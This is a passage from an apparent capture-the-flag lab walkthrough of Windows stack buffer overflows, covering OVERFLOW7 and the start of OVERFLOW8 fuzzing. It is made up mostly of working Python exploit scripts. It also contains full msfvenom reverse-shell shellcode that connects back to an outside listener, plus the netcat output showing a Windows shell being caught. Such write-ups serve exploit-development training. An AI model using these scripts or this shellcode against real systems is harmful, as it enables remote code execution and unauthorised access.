Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co 
```
{% endraw %}

<br />
Update the code with the pattern_create string that we just generated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# inputBuffer = b'A' * 2000
inputBuffer = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the EIP and note the value that is stored in the register.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of7/thirdeip.png" title="Get EIP Value" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run the string from the regster through msf-pattern_offset to get the exact offset.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW7]
└─$ msf-pattern_offset -l 2000 -q 72423572                                                                                       
[*] Exact match at offset 1306
```
{% endraw %}

<br />
Update the code to include the offset value that we just calculated.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 1306
inputBuffer += b'B' * 4
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Run the script and view the 42s in EIP.  Update the code with a list of all the badchars wo we can test them.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1306
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Check the ESP register to view the baschars and find any mangles.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of7/firstbadesp.png" title="First Badchar ESP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Look for sections where the string drops, missing, or change.  Remove the bad character from the set.  Resend it and scan ESP for more bad characters.  Repeat until you have found them all.  Gotta catch 'em all.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

# baddies = \x00\x8c\xae\xbe\xfb

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfc\xfd\xfe\xff"
)

inputBuffer = b'A' * 1306
inputBuffer += b'B' * 4
inputBuffer += badchars
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Update the code to change the badchars to payload = b'D' * 400 as a stub for the payload.  Then, in WinDBG, load the narly extension.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of7/narly.png" title="Load Narly" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Run nmod to get a list of modules and their security to find the appropriate module.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of7/findaddy.png" title="Find address" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the code with the address that was discovered in the essfunc.dll.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x8c\xae\xbe\xfb

payload = b'D' * 400

inputBuffer = b'A' * 1306
inputBuffer += pack('<L',(0x625011af))
inputBuffer += payload
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Use msfvenom to generate a payload.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW7]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=443 ExitFunc=thread -f python -b '\x00\x8c\xae\xbe\xfb' -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of python file: 1887 bytes
payload =  b""
payload += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
payload += b"\x5e\x81\x76\x0e\x49\x74\x2f\x9b\x83\xee\xfc"
payload += b"\xe2\xf4\xb5\x9c\xad\x9b\x49\x74\x4f\x12\xac"
payload += b"\x45\xef\xff\xc2\x24\x1f\x10\x1b\x78\xa4\xc9"
payload += b"\x5d\xff\x5d\xb3\x46\xc3\x65\xbd\x78\x8b\x83"
payload += b"\xa7\x28\x08\x2d\xb7\x69\xb5\xe0\x96\x48\xb3"
payload += b"\xcd\x69\x1b\x23\xa4\xc9\x59\xff\x65\xa7\xc2"
payload += b"\x38\x3e\xe3\xaa\x3c\x2e\x4a\x18\xff\x76\xbb"
payload += b"\x48\xa7\xa4\xd2\x51\x97\x15\xd2\xc2\x40\xa4"
payload += b"\x9a\x9f\x45\xd0\x37\x88\xbb\x22\x9a\x8e\x4c"
payload += b"\xcf\xee\xbf\x77\x52\x63\x72\x09\x0b\xee\xad"
payload += b"\x2c\xa4\xc3\x6d\x75\xfc\xfd\xc2\x78\x64\x10"
payload += b"\x11\x68\x2e\x48\xc2\x70\xa4\x9a\x99\xfd\x6b"
payload += b"\xbf\x6d\x2f\x74\xfa\x10\x2e\x7e\x64\xa9\x2b"
payload += b"\x70\xc1\xc2\x66\xc4\x16\x14\x1c\x1c\xa9\x49"
payload += b"\x74\x47\xec\x3a\x46\x70\xcf\x21\x38\x58\xbd"
payload += b"\x4e\x8b\xfa\x23\xd9\x75\x2f\x9b\x60\xb0\x7b"
payload += b"\xcb\x21\x5d\xaf\xf0\x49\x8b\xfa\xcb\x19\x24"
payload += b"\x7f\xdb\x19\x34\x7f\xf3\xa3\x7b\xf0\x7b\xb6"
payload += b"\xa1\xb8\xf1\x4c\x1c\x25\x9b\x49\x72\x47\x99"
payload += b"\x49\x75\x94\x12\xaf\x1e\x3f\xcd\x1e\x1c\xb6"
payload += b"\x3e\x3d\x15\xd0\x4e\xcc\xb4\x5b\x97\xb6\x3a"
payload += b"\x27\xee\xa5\x1c\xdf\x2e\xeb\x22\xd0\x4e\x21"
payload += b"\x17\x42\xff\x49\xfd\xcc\xcc\x1e\x23\x1e\x6d"
payload += b"\x23\x66\x76\xcd\xab\x89\x49\x5c\x0d\x50\x13"
payload += b"\x9a\x48\xf9\x6b\xbf\x59\xb2\x2f\xdf\x1d\x24"
payload += b"\x79\xcd\x1f\x32\x79\xd5\x1f\x22\x7c\xcd\x21"
payload += b"\x0d\xe3\xa4\xcf\x8b\xfa\x12\xa9\x3a\x79\xdd"
payload += b"\xb6\x44\x47\x93\xce\x69\x4f\x64\x9c\xcf\xcf"
payload += b"\x86\x63\x7e\x47\x3d\xdc\xc9\xb2\x64\x9c\x48"
payload += b"\x29\xe7\x43\xf4\xd4\x7b\x3c\x71\x94\xdc\x5a"
payload += b"\x06\x40\xf1\x49\x27\xd0\x4e" 
```
{% endraw %}

<br />
Update the code with a nop sled and the payload we just generated.

{% raw %}
```python
import socket
from struct import pack

url = '10.0.0.7'
port = 1337

# baddies = \x00\x8c\xae\xbe\xfb

payload =  b""
payload += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
payload += b"\x5e\x81\x76\x0e\x49\x74\x2f\x9b\x83\xee\xfc"
payload += b"\xe2\xf4\xb5\x9c\xad\x9b\x49\x74\x4f\x12\xac"
payload += b"\x45\xef\xff\xc2\x24\x1f\x10\x1b\x78\xa4\xc9"
payload += b"\x5d\xff\x5d\xb3\x46\xc3\x65\xbd\x78\x8b\x83"
payload += b"\xa7\x28\x08\x2d\xb7\x69\xb5\xe0\x96\x48\xb3"
payload += b"\xcd\x69\x1b\x23\xa4\xc9\x59\xff\x65\xa7\xc2"
payload += b"\x38\x3e\xe3\xaa\x3c\x2e\x4a\x18\xff\x76\xbb"
payload += b"\x48\xa7\xa4\xd2\x51\x97\x15\xd2\xc2\x40\xa4"
payload += b"\x9a\x9f\x45\xd0\x37\x88\xbb\x22\x9a\x8e\x4c"
payload += b"\xcf\xee\xbf\x77\x52\x63\x72\x09\x0b\xee\xad"
payload += b"\x2c\xa4\xc3\x6d\x75\xfc\xfd\xc2\x78\x64\x10"
payload += b"\x11\x68\x2e\x48\xc2\x70\xa4\x9a\x99\xfd\x6b"
payload += b"\xbf\x6d\x2f\x74\xfa\x10\x2e\x7e\x64\xa9\x2b"
payload += b"\x70\xc1\xc2\x66\xc4\x16\x14\x1c\x1c\xa9\x49"
payload += b"\x74\x47\xec\x3a\x46\x70\xcf\x21\x38\x58\xbd"
payload += b"\x4e\x8b\xfa\x23\xd9\x75\x2f\x9b\x60\xb0\x7b"
payload += b"\xcb\x21\x5d\xaf\xf0\x49\x8b\xfa\xcb\x19\x24"
payload += b"\x7f\xdb\x19\x34\x7f\xf3\xa3\x7b\xf0\x7b\xb6"
payload += b"\xa1\xb8\xf1\x4c\x1c\x25\x9b\x49\x72\x47\x99"
payload += b"\x49\x75\x94\x12\xaf\x1e\x3f\xcd\x1e\x1c\xb6"
payload += b"\x3e\x3d\x15\xd0\x4e\xcc\xb4\x5b\x97\xb6\x3a"
payload += b"\x27\xee\xa5\x1c\xdf\x2e\xeb\x22\xd0\x4e\x21"
payload += b"\x17\x42\xff\x49\xfd\xcc\xcc\x1e\x23\x1e\x6d"
payload += b"\x23\x66\x76\xcd\xab\x89\x49\x5c\x0d\x50\x13"
payload += b"\x9a\x48\xf9\x6b\xbf\x59\xb2\x2f\xdf\x1d\x24"
payload += b"\x79\xcd\x1f\x32\x79\xd5\x1f\x22\x7c\xcd\x21"
payload += b"\x0d\xe3\xa4\xcf\x8b\xfa\x12\xa9\x3a\x79\xdd"
payload += b"\xb6\x44\x47\x93\xce\x69\x4f\x64\x9c\xcf\xcf"
payload += b"\x86\x63\x7e\x47\x3d\xdc\xc9\xb2\x64\x9c\x48"
payload += b"\x29\xe7\x43\xf4\xd4\x7b\x3c\x71\x94\xdc\x5a"
payload += b"\x06\x40\xf1\x49\x27\xd0\x4e"

inputBuffer = b'A' * 1306
inputBuffer += pack('<L',(0x625011af))
inputBuffer += b'\x90' * 16
inputBuffer += payload
inputBuffer += b'C' * (2000 - len(inputBuffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.sendall(b'OVERFLOW7 ' + inputBuffer + b'\r\n')

s.close() 
```
{% endraw %}

<br />
Start a netcat listener.  Run the code.  Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW7]
└─$ sudo nc -nlvp 443                         
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.7] 56187
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Windows Kits\10\Debuggers>
```
{% endraw %}

<br />
<b><u>OVERFLOW8<br /></u></b>

Create a script that connects to the service and sends the OVERFLOW8 command mimicking normal usage.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
print(s.recv(1024))

s.send(b'OVERFLOW8 aaaa\r\n')
print(s.recv(1024))

s.close()
```
{% endraw %}

<br />
Update the code to fuzz the command with increasing length to find the breakpoint.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

buffers = [b'A']
counter = 100
while len(buffers) < 30:
    buffers.append(b'A' * counter)
    counter += 100

for inputBuffer in buffers:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((url,port))
    s.recv(1024)

    print('[*] Sending: {size}'.format(size=len(inputBuffer)))
    s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')
    s.recv(1024)

    s.close() 
```
{% endraw %}

<br />
Run the code and observe the breakpoint.

{% raw %}
```python
= RESTART: /home/kali/Documents/thm/bufferoverflowprep/OVERFLOW8/thm-overflow8_0x01.py
[*] Sending: 1
[*] Sending: 100
[*] Sending: 200
[*] Sending: 300
[*] Sending: 400
[*] Sending: 500
[*] Sending: 600
[*] Sending: 700
[*] Sending: 800
[*] Sending: 900
[*] Sending: 1000
[*] Sending: 1100
[*] Sending: 1200
[*] Sending: 1300
[*] Sending: 1400
[*] Sending: 1500
[*] Sending: 1600
[*] Sending: 1700
[*] Sending: 1800
```
{% endraw %}

<br />
Check the EIP to ensure that we have control of EIP.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of8/firsteip.png" title="First EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Update the script to hardcode the size that breaks the buffer.

{% raw %}
```python
import socket

url = '10.0.0.7'
port = 1337

inputBuffer = b'A' * 2200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((url,port))
s.recv(1024)

print('[*] Sending: {size}'.format(size=len(inputBuffer)))
s.send(b'OVERFLOW8 ' + inputBuffer + b'\r\n')

s.close()
```
{% endraw %}

<br />
Run the code and check EIP to ensure that we still have control.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/bofprep/of8/seceip.png" title="Second EIP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/bufferoverflowprep/OVERFLOW4]
└─$ msf-pattern_create -l 2200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8